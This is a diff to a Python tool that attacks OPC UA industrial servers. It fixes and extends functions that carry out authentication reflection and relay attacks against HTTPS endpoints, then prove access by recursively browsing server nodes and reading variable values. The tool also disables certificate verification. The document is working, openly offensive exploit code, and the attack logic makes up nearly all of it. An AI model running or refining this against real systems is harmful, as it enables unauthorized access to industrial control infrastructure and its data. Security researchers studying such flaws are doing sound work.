@@ -1,4 +1,5 @@
 import requests
+requests.packages.urllib3.disable_warnings()
 
 from messages import *
 from message_fields import *
@@ -8,6 +9,7 @@ from datetime import datetime
 from socket import socket, create_connection
 from random import randint
 from enum import Enum, auto
+from binascii import unhexlify
 
 import sys, os, itertools, re
 
@@ -45,7 +47,7 @@ def parse_endpoint_url(url):
     }
     if m.group('scheme') not in protos:
       raise Exception(f'Unsupported protocol: "{m.group("scheme")}" in URL {url}.')
-    return (protos[m.group('scheme')], **m.group('host', 'port'))
+    return (protos[m.group('scheme')], *m.group('host', 'port'))
 
 # Common routines.
 
@@ -176,11 +178,11 @@ def https_exchange(
     'Content-Type': 'application/octet-stream',
   }
   if nonce_policy is not None:
-    headers['OPCUA-SecurityPolicy'] =  nonce_policy.value
+    headers['OPCUA-SecurityPolicy'] =  f'http://opcfoundation.org/UA/SecurityPolicy#{nonce_policy.value}'
     
   reqbody = reqfield.to_bytes(reqfield.create(**req_data))
   http_resp = requests.post(url, verify=False, headers=headers, data=reqbody)
-  return respfield.from_bytes(http_resp.content)
+  return respfield.from_bytes(http_resp.content)[0]
 
 # Picks either session_exchange or https_exchanged based on channel type.
 def generic_exchange(
@@ -277,14 +279,13 @@ def execute_relay_attack(
 
 # Demonstrate access by recursively browsing nodes. Variables are read.
 # Based on https://reference.opcfoundation.org/Core/Part4/v104/docs/5.8.2
-def demonstrate_access(chan : ChannelState | str, authToken : NodeId):
+def demonstrate_access(chan : ChannelState | str, authToken : NodeId, policy : SecurityPolicy = None):
   max_children = 100
   recursive_nodeclasses = {NodeClass.OBJECT}
   read_nodeclasses = {NodeClass.VARIABLE}
   
-  print(repr(viewDescription.default_value))
   def browse_from(root, depth):
-    bresp = generic_exchange(chan, None, browseRequest, browseResponse,
+    bresp = generic_exchange(chan, policy, browseRequest, browseResponse,
       requestHeader=simple_requestheader(authToken),
       view=viewDescription.default_value,
       requestedMaxReferencesPerNode=max_children,
@@ -304,11 +305,11 @@ def demonstrate_access(chan : ChannelState | str, authToken : NodeId):
         if ref.nodeClass in recursive_nodeclasses:
           # Keep browsing recursively.
           log_success(tree_prefix + f'+ {ref.displayName.text} ({ref.nodeClass.name})')
-          browse_from(ref.nodeId.nodeId)
+          browse_from(ref.nodeId.nodeId, depth + 1)
         elif ref.nodeClass in read_nodeclasses:
           # Read current variable value. For the sake of simplicity do one at a time.
           try:
-            readresp = session_exchange(chan, readRequest, readResponse,
+            readresp = generic_exchange(chan, policy, readRequest, readResponse,
               requestHeader=simple_requestheader(authToken),
               maxAge=0,
               timestampsToReturn=TimestampsToReturn.BOTH,
@@ -316,12 +317,23 @@ def demonstrate_access(chan : ChannelState | str, authToken : NodeId):
                 nodeId=ref.nodeId.nodeId,
                 attributeId=0x0d, # Request value
                 indexRange=None,
-                dataEncoding=QualifiedNameField.default_value,
+                dataEncoding=QualifiedNameField().default_value,
               )],
             )
-            log_success(tree_prefix + f'- {ref.displayName.text}: "{readresp.value}"')
+            
+            for r in readresp.results:
+              if type(r.value) == list:
+                log_success(tree_prefix + f'+ {ref.displayName.text} (Array):')
+                for subval in r.value:
+                  log_success(' ' + tree_prefix + f'+ {ref.displayName.text}: "{subval}"')
+              else:
+                log_success(tree_prefix + f'- {ref.displayName.text}: "{r.value}"')
           except UnsupportedFieldException as ex:
             log_success(tree_prefix + f'- {ref.displayName.text}: <{ex.fieldname}>')
+          except DecodeError as ex:
+            log_success(tree_prefix + f'- {ref.displayName.text}: <decode error>')
+          except Exception as ex:
+            log_success(tree_prefix + f'- {ref.displayName.text}: <{type(ex)}>')
         else:
           log_success(tree_prefix + f'- {ref.displayName.text} ({ref.nodeClass.name})')
           
@@ -338,7 +350,7 @@ def demonstrate_access(chan : ChannelState | str, authToken : NodeId):
 def reflect_attack(url : str):
   proto, host, port = parse_endpoint_url(url)
   log(f'Attempting reflection attack against {url}')
-  endpoints = get_endpoints(proto, host, port)
+  endpoints = get_endpoints(url)
   log(f'Server advertises {len(endpoints)} endpoints.')
   
   # Try to attack against the first endpoint with an HTTPS transport and a non-None security policy.
@@ -347,24 +359,23 @@ def reflect_attack(url : str):
     target = https_eps[0]
     tproto, thost, tport = parse_endpoint_url(target.endpointUrl)
     assert tproto == TransportProtocol.HTTPS
-    log(f'Targeting {target.endpointUrl} with {target.securityPolicyUri.name} security policy.')
-    # with connect_and_hello(thost, tport) as sock1, connect_and_hello(thost, tport) as sock2:
-    #   mainchan, oraclechan = unencrypted_opn(sock1), unencrypted_opn(sock2)
-    token = execute_relay_attack(target.endpointUrl, target, target.endpointUrl, target)
-    log_success(f'Attack succesfull! Authenticated session set up with {target.endpointUrl}.')
-    demonstrate_access(mainchan, token)
+    url = target.endpointUrl
+    log(f'Targeting {url} with {target.securityPolicyUri.name} security policy.')
+    token = execute_relay_attack(url, target, url, target)
+    log_success(f'Attack succesfull! Authenticated session set up with {url}.')
+    demonstrate_access(url, token, target.securityPolicyUri)
   else:
     raise AttackNotPossible('TODO: implement combination with OPN attack.')
       
 def relay_attack(source_url : str, target_url : str):
   log(f'Attempting relay from {source_url} to {target_url}')
-  seps = get_endpoints(*source)
-  log(f'Listed {len(seps)} endpoints from {a2url(source)}.')
-  teps = get_endpoints(*target)
-  log(f'Listed {len(teps)} endpoints from {a2url(target)}.')
+  seps = get_endpoints(source_url)
+  log(f'Listed {len(seps)} endpoints from {a2url(source_url)}.')
+  teps = get_endpoints(target_url)
+  log(f'Listed {len(teps)} endpoints from {a2url(target_url)}.')
   
   # Prioritize HTTPS targets with a non-NONE security policy.
-  sort(teps, key=lambda ep: [not ep.transportProfileUri.endswith('https-uabinary'), spe.securityPolicyUri == SecurityPolicy.NONE])
+  sort(teps, key=lambda ep: [not ep.transportProfileUri.endswith('https-uabinary'), ep.securityPolicyUri == SecurityPolicy.NONE])
   
   tmpsock = None
   try:
@@ -384,10 +395,10 @@ def relay_attack(source_url : str, target_url : str):
         else:
           continue
           
-        log(f'Trying endpoints {sep.endpointUrl} ({sep.securityPolicyUri.name})-> {tep.endpointUrl} ({sep.securityPolicyUri.name})')
+        log(f'Trying endpoints {sep.endpointUrl} ({sep.securityPolicyUri.name})-> {tep.endpointUrl} ({tep.securityPolicyUri.name})')
         token = execute_relay_attack(oraclechan, sep, mainchan, tep)
         log_success(f'Attack succesfull! Authenticated session set up with {tep.endpointUrl}.')
-        demonstrate_access(mainchan, token)
+        demonstrate_access(mainchan, token, tep.securityPolicyUri)
         return
     
     raise AttackNotPossible('TODO: implement combination with OPN attack.')
